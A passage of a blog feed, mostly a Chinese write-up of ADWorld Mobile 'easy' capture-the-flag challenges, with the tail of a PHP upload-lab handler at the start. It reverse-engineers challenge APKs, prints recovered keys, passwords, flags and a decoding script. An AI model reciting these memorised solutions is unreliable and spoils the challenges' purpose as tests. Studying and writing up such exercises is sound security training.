class="comment">//针对性地检查图片文件</span></span><br><span class="line">        <span class="variable">$temp_file</span>=reCodeImg(<span class="variable">$temp_file</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$temp_file</span>==<span class="string">&quot;Error&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span>=<span class="string">&quot;检测到恶意语句&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="variable">$new_file_path</span>= UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span> . <span class="variable">$new_file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;很久之前的实训课程实验记录，权当凑数。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Easy Mobile of ADWorld</title>
    <link href="http://slient2009.github.io/2021/10/18/ADWorld-Mobile-Easy/"/>
    <id>http://slient2009.github.io/2021/10/18/ADWorld-Mobile-Easy/</id>
    <published>2021-10-18T04:00:01.000Z</published>
    <updated>2022-01-07T12:09:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>攻防世界刷题：Mobile， Easy部分。</p><span id="more"></span><h1 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h1><p>so层逆向，简单的字符串变换，先交换前后16个字符，然后每两个字符交换位置。<br>顺便体验了一下so动态调试。</p><p><a href="https://zhuanlan.zhihu.com/p/58468014">https://zhuanlan.zhihu.com/p/58468014</a><br><a href="https://blog.csdn.net/hbhgyu/article/details/81321923">https://blog.csdn.net/hbhgyu/article/details/81321923</a></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210923210058516.png" alt="image-20210923210058516"></p><h1 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.btn.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg10)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String inputString = MainActivity.<span class="keyword">this</span>.text.getText().toString();</span><br><span class="line">            PackageInfo pinfo = MainActivity.<span class="keyword">this</span>.getPackageManager().getPackageInfo(<span class="string">&quot;com.example.yaphetshan.tencentgreat&quot;</span>, <span class="number">0x4000</span>);</span><br><span class="line">            String versionCode = pinfo.versionName; <span class="comment">//&quot;X&lt;cP[?PHNB&lt;P?aj&quot;;</span></span><br><span class="line">            <span class="keyword">int</span> versionName = pinfo.versionCode; <span class="comment">//15</span></span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; inputString.length() &amp;&amp; i &lt; versionCode.length(); ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span>(inputString.charAt(i) != (versionCode.charAt(i) ^ versionName)) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;再接再厉，加油~&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(inputString.length() == versionCode.length()) &#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;恭喜开启闯关之门！&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(PackageManager.NameNotFoundException v5) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;年轻人不要耍小聪明噢&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h1><p>有点儿莫名其妙的一个题。</p><p>在<code>com.tencent.testvuln.SecondActivity.onCreate</code>中，检查了username和password，具体是通过native的<code>doRawData()</code>函数基于AES进行校验。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span>  <span class="comment">// com.tencent.testvuln.a</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg6)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(arg6);</span><br><span class="line">    <span class="keyword">this</span>.setContentView(<span class="number">0x7F030001</span>);  <span class="comment">// layout:activity_main2</span></span><br><span class="line">    Intent v0 = <span class="keyword">this</span>.getIntent();</span><br><span class="line">    String ili_name = v0.getStringExtra(<span class="string">&quot;ili&quot;</span>);  <span class="comment">// name</span></span><br><span class="line">    String lil_pwd = v0.getStringExtra(<span class="string">&quot;lil&quot;</span>);  <span class="comment">// pwd</span></span><br><span class="line">    <span class="comment">// Base64(AES(name+pwd, key)) == &quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(Encryto.doRawData(<span class="keyword">this</span>, ili_name + lil_pwd).equals(<span class="string">&quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;</span>)) &#123;</span><br><span class="line">        v0.setAction(<span class="string">&quot;android.test.action.MoniterInstallService&quot;</span>);</span><br><span class="line">        v0.setClass(<span class="keyword">this</span>, MoniterInstallService.class);</span><br><span class="line">        v0.putExtra(<span class="string">&quot;company&quot;</span>, <span class="string">&quot;tencent&quot;</span>);</span><br><span class="line">        v0.putExtra(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">        v0.putExtra(<span class="string">&quot;age&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="keyword">this</span>.startActivity(v0);</span><br><span class="line">        <span class="keyword">this</span>.startService(v0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SharedPreferences.Editor v0_1 = <span class="keyword">this</span>.getSharedPreferences(<span class="string">&quot;test&quot;</span>, <span class="number">0</span>).edit();</span><br><span class="line">    v0_1.putString(<span class="string">&quot;ilil&quot;</span>, ili_name);</span><br><span class="line">    v0_1.putString(<span class="string">&quot;lili&quot;</span>, lil_pwd);</span><br><span class="line">    v0_1.commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟到native层的<code>doRawData()</code>，发现直接给出的AES的加密模式和加密密钥。去<a href="http://tool.chacuo.net/cryptaes/%E8%A7%A3%E5%87%BA%E6%9D%A5%E5%BE%97%E5%88%B0%60username=tencent">http://tool.chacuo.net/cryptaes/解出来得到`username=tencent</a> password=aimage`。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jstring __fastcall <span class="title">doRawData</span><span class="params">(JNIEnv *env, jobject thiz, <span class="keyword">int</span> jclass, <span class="keyword">int</span> str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *String; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// r8</span></span><br><span class="line">  jstring result; <span class="comment">// r0</span></span><br><span class="line">  jstring (*v9)(JNIEnv *, <span class="keyword">const</span> jchar *, jsize); <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// r5</span></span><br><span class="line">  size_t v11; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> key[<span class="number">24</span>]; <span class="comment">// [sp+0h] [bp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( j_checkSignature((<span class="keyword">int</span>)env, (<span class="keyword">int</span>)thiz, jclass) == <span class="number">1</span> )<span class="comment">// j_checkSignature(env, thiz, jclass)</span></span><br><span class="line">  &#123;</span><br><span class="line">    strcpy(key, <span class="string">&quot;thisisatestkey==&quot;</span>);</span><br><span class="line">    String = (*env)-&gt;GetStringUTFChars(env, str, <span class="number">0</span>);</span><br><span class="line">    v7 = (<span class="keyword">const</span> <span class="keyword">char</span> *)j_AES_128_ECB_PKCS5Padding_Encrypt(String, key);</span><br><span class="line">    (*env)-&gt;ReleaseStringUTFChars(env, (jstring)str, String);</span><br><span class="line">    result = (*env)-&gt;NewStringUTF(env, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = (*env)-&gt;NewString;</span><br><span class="line">    v10 = UNSIGNATURE[<span class="number">0</span>];</span><br><span class="line">    v11 = strlen(UNSIGNATURE[<span class="number">0</span>]);               <span class="comment">// &quot;UNSIGNATURE&quot;</span></span><br><span class="line">    result = v9(env, (<span class="keyword">const</span> jchar *)v10, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个信息没什么用，之后的代码去开启了一个service监听指定路径下的文件变化，但是监听的回调函数也没进行什么可疑操作，不知道在哪儿去操作或者展示了flag。<br>扫一下其他class的代码，发现了在<code>FileDataActivity</code>中进行了AES解密操作，解出来得到<code>flag = Cas3_0f_A_CAK3</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileDataActivity</span> <span class="keyword">extends</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> TextView c;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// com.tencent.testvuln.a</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg3);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F030002</span>);  <span class="comment">// layout:activity_main3</span></span><br><span class="line">        <span class="keyword">this</span>.c = (TextView)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070000</span>);  <span class="comment">// id:textView1</span></span><br><span class="line">        <span class="keyword">this</span>.c.setText(Encryto.decode(<span class="keyword">this</span>, <span class="string">&quot;9YuQ2dk8CSaCe7DTAmaqAA==&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个activity貌似没有在其他class的代码中被调用过，不知道在哪儿暗示了这个是flag，反正就挺莫名其妙的。</p><h1 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h1><p>下载得到一个<code>.ab</code>，它是Android的备份文件，用<a href="https://github.com/nelenkov/android-backup-extractor/">工具</a>打开得到一个apk和两个db文件。<br>这个apk在我的设备上运行不了，提示缺少一些so文件，在这个<a href="https://github.com/pfalcon/android-platform-headers/tree/master/android-2.3.5_r1/lib">仓库</a>里面可以找到多数的so文件，然后补上icu文件依然运行不了，遂作罢。</p><p>于是静态分析代码，关键在这个方法里面。主要是根据<code>name=Stranger password=123456</code>生成了数据库的加密密钥，且该数据库通过<code>sqlcipher</code>完成加解密操作。<br>跟着代码逻辑，可以用在线工具得到数据库密码为<code>ae56f99</code>，然后使用工具<a href="https://github.com/slient2009/PicGo/blob/main/files/sqlcipher-3.0.1.zip">sqlcipher-shell</a>解密两个数据库文件，从中可以翻到flag的base64字符串。<br>也可以直接用<a href="https://sqlitebrowser.org/">sqlitebrowser</a>打开，选择Sqlcipher3默认。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase.loadLibs(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.mySQLhelper = <span class="keyword">new</span> mySQLutils(<span class="keyword">this</span>, <span class="string">&quot;Demo.db&quot;</span>, <span class="keyword">null</span>, <span class="number">1</span>);</span><br><span class="line">        ContentValues v0 = <span class="keyword">new</span> ContentValues();</span><br><span class="line">        v0.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Stranger&quot;</span>);</span><br><span class="line">        v0.put(<span class="string">&quot;password&quot;</span>, Integer.valueOf(<span class="number">123456</span>));</span><br><span class="line">        a v1 = <span class="keyword">new</span> a();</span><br><span class="line">        String Stra1234 = v1.concat4_4(v0.getAsString(<span class="string">&quot;name&quot;</span>), v0.getAsString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.a = <span class="keyword">this</span>.mySQLhelper.getWritableDatabase(v1.SHA1(Stra1234 + v1.md5(Stra1234, v0.getAsString(<span class="string">&quot;password&quot;</span>))).substring(<span class="number">0</span>, <span class="number">7</span>));</span><br><span class="line">        <span class="keyword">this</span>.a.insert(<span class="string">&quot;TencentMicrMsg&quot;</span>, <span class="keyword">null</span>, v0);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220106150739.png" alt="image-20220106150732621"></p><h1 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#换表base64解密脚本，https://www.programminghunter.com/article/2612605879/</span></span><br><span class="line"><span class="comment">#结果要包裹flag&#123;&#125;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure><h1 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h1><p>检查代码发现是一个类似于转轮机的加密程序，把反编译代码复制下来，添加爆破的代码片段即可。<br>需要注意的是，我的jeb对一些细节处理不够好，比如下面这个转动密码表的<code>rot1</code>函数。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211010134638847.png" alt="image-20211010134638847"></p><p>在汇编代码中，先是把list中的头部元素取出，然后remove(0)，接着把取出的头部元素加入的尾部。<br>但是在反编译的得到的java代码中，却先remove(0)移除了头部元素，然后再把头部元素(相当于第二个元素)复制到末尾，造成逻辑错误，需要交换顺序。<br>同样的情况还发生在<code>com.a.easyjava.a.a() </code>中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ArrayList integerList;</span><br><span class="line">    <span class="keyword">static</span> String b;</span><br><span class="line">    Integer[] c;</span><br><span class="line">    <span class="keyword">static</span> Integer cnt;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">a</span><span class="params">(Integer rotIndex)</span> </span>&#123;</span><br><span class="line">        a.integerList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        a.b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">        a.cnt = (<span class="keyword">int</span>)<span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">this</span>.c = <span class="keyword">new</span> Integer[]&#123;<span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> v0;</span><br><span class="line">        <span class="keyword">for</span>(v0 = (<span class="keyword">int</span>)rotIndex; v0 &lt; <span class="keyword">this</span>.c.length; ++v0) &#123;</span><br><span class="line">            a.integerList.add(<span class="keyword">this</span>.c[v0]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v0_1;</span><br><span class="line">        <span class="keyword">for</span>(v0_1 = <span class="number">0</span>; v0_1 &lt; ((<span class="keyword">int</span>)rotIndex); ++v0_1) &#123;</span><br><span class="line">            a.integerList.add(<span class="keyword">this</span>.c[v0_1]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        a.cnt = (<span class="keyword">int</span>)(((<span class="keyword">int</span>)a.cnt) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(((<span class="keyword">int</span>)a.cnt) == <span class="number">25</span>) &#123;</span><br><span class="line">            a.integerList.add(Integer.valueOf(((Integer)a.integerList.get(<span class="number">0</span>)).intValue()));</span><br><span class="line">            a.integerList.remove(<span class="number">0</span>);</span><br><span class="line">            a.cnt = (<span class="keyword">int</span>)<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getCharByNumIndex</span><span class="params">(Integer arg5)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">        Integer v1 = (<span class="keyword">int</span>)<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(((<span class="keyword">int</span>)arg5) == -<span class="number">10</span>) &#123;</span><br><span class="line">            a.a();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.charAt(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(v0 &lt; a.integerList.size() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a.integerList.get(v0) == arg5) &#123;</span><br><span class="line">                v1 = (<span class="keyword">int</span>)v0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++v0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        a.a();</span><br><span class="line">        <span class="keyword">return</span> a.b.charAt(v1.intValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ArrayList integerList;</span><br><span class="line">    <span class="keyword">static</span> String chars;</span><br><span class="line">    Integer[] c;</span><br><span class="line">    <span class="keyword">static</span> Integer rotateCnt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">b</span><span class="params">(Integer rotIndex)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        b.integerList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        b.chars = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">        b.rotateCnt = (<span class="keyword">int</span>)<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.c = <span class="keyword">new</span> Integer[]&#123;<span class="number">8</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> v0;</span><br><span class="line">        <span class="keyword">for</span>(v0 = (<span class="keyword">int</span>)rotIndex; v0 &lt; <span class="keyword">this</span>.c.length; ++v0) &#123;</span><br><span class="line">            b.integerList.add(<span class="keyword">this</span>.c[v0]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v0_1;</span><br><span class="line">        <span class="keyword">for</span>(v0_1 = <span class="number">0</span>; v0_1 &lt; ((<span class="keyword">int</span>)rotIndex); ++v0_1) &#123;</span><br><span class="line">            b.integerList.add(<span class="keyword">this</span>.c[v0_1]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rot1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        b.integerList.add(Integer.valueOf(((Integer)b.integerList.get(<span class="number">0</span>)).intValue()));</span><br><span class="line">        b.integerList.remove(<span class="number">0</span>);</span><br><span class="line">        b.chars = b.chars + <span class="string">&quot;&quot;</span> + b.chars.charAt(<span class="number">0</span>);</span><br><span class="line">        b.chars = b.chars.substring(<span class="number">1</span>, <span class="number">27</span>);</span><br><span class="line">        b.rotateCnt = (<span class="keyword">int</span>)(((<span class="keyword">int</span>)b.rotateCnt) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">indexOf</span><span class="params">(String arg5)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ind = <span class="number">0</span>;</span><br><span class="line">        Integer v1 = (<span 